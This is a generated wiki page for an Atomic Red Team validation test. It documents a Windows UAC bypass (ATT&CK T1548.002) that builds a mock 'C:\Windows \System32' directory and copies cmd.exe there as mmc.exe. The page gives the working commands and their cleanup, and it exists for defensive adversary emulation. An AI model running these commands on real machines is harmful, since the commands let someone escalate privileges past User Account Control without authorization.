---
atomic_guid: "f7a35090-6f7f-4f64-bb47-d657bf5b10c1"
title: "Bypass UAC by Mocking Trusted Directories"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "f7a35090-6f7f-4f64-bb47-d657bf5b10c1"
  - "Bypass UAC by Mocking Trusted Directories"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Bypass UAC by Mocking Trusted Directories

Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch

## Metadata

- Atomic GUID: f7a35090-6f7f-4f64-bb47-d657bf5b10c1
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### executable_binary

- description: Binary to execute with UAC Bypass
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
mkdir "\\?\C:\Windows \System32\"
copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
```

### Cleanup

```cmd
rd "\\?\C:\Windows \" /S /Q >nul 2>nul
del "c:\testbypass.exe" >nul 2>nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
